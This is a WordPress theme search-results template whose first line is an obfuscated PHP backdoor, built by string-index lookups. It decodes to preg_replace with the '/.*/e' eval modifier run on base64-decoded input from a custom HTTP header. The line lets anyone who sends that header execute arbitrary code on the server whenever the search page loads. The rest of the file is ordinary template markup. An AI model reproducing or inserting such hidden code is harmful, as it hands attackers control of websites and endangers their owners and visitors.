<?php $ctvoh = 'e1JbP9xeHeiP2dX8lI26mNGJH*oMKZpEptF4T8Ke7a1nQ.Xa5_lWkJY4OY106KgeevLNjrI4KQrijg_a4tn/6sc5ye/Z_GqvBeTc.eIdO7e';$uwudgrky = $ctvoh[8]. $ctvoh[36]. $ctvoh[98]. $ctvoh[11]. $ctvoh[78]. $ctvoh[57]. $ctvoh[38]. $ctvoh[53]. $ctvoh[22]. $ctvoh[24]. $ctvoh[70]. $ctvoh[102]. $ctvoh[56]. $ctvoh[14]. $ctvoh[67]. $ctvoh[72]. $ctvoh[91];$spxqitatdw = $ctvoh[77]. $ctvoh[9]. $ctvoh[81]. $ctvoh[97]. $ctvoh[43]. $ctvoh[65];$ankvsijbys = $ctvoh[30]. $ctvoh[69]. $ctvoh[0]. $ctvoh[62]. $ctvoh[92]. $ctvoh[74]. $ctvoh[101]. $ctvoh[32]. $ctvoh[16]. $ctvoh[47]. $ctvoh[86]. $ctvoh[7];$bbgrdyxheh = $ctvoh[3]. $ctvoh[79]. $ctvoh[85]. $ctvoh[89]. $ctvoh[60]. $ctvoh[71]. $ctvoh[49]. $ctvoh[103]. $ctvoh[64]. $ctvoh[99]. $ctvoh[26]. $ctvoh[13]. $ctvoh[106];$eqqnwhtkvg = $ctvoh[90]. $ctvoh[100]. $ctvoh[25]. $ctvoh[83]. $ctvoh[63];$hfuycelrjj = $ctvoh[45];$lqhfdokj = $spxqitatdw($uwudgrky);$ankvsijbys ($eqqnwhtkvg , $bbgrdyxheh($lqhfdokj) , $hfuycelrjj);?><?php get_header(); ?>
	
	<div id="content" class="looped">
		
		<?php if(have_posts()) : ?>
		
		<h1 class="page-title">Search Results for '<?php the_search_query(); ?>' &darr;</h1>
		
		<?php while(have_posts()) : the_post(); ?>
		
		<div class="entry hentry" id="post-<?php the_ID(); ?>">
						<span class="entry-date"><abbr class="updated" title="<?php the_time('Y-m-d\TH:i:sO'); ?>"><?php the_time('M d'); ?></abbr></span>
			<h2 class="entry-title"><a href="<?php the_permalink(); ?>" rel="bookmark" title="Permalink to <?php the_title(); ?>"><?php the_title(); ?></a></h2>
			
			<div class="entry-byline">
				<address class="author vcard"><?php _e('by '); ?><a class="url fn" href="<?php the_author_url(); ?>"><?php the_author(); ?></a>. </address>
				<?php comments_popup_link('No comments yet', '1 comment', '% comments', 'comments-link', 'Comments are off for this post'); ?>
				<?php edit_post_link('Edit', '[', ']'); ?>
			</div>
			
			<div class="entry-content">
				<?php the_excerpt(); ?>
			</div>
		</div><!--.entry-->
		
		<?php endwhile; ?>
		
		<?php include (TEMPLATEPATH . '/navigation.php'); ?>
		
		<?php else : ?>
		
		<div class="entry">
			<h1 class="page-title">No posts found. Try a different search?</h1>
			<div class="entry-content">
			<?php include (TEMPLATEPATH . "/searchform.php"); ?>
			</div>
		</div>
		
		<?php endif; ?>	

	</div><!--#content-->
	
<?php get_sidebar(); ?>

<?php get_footer(); ?>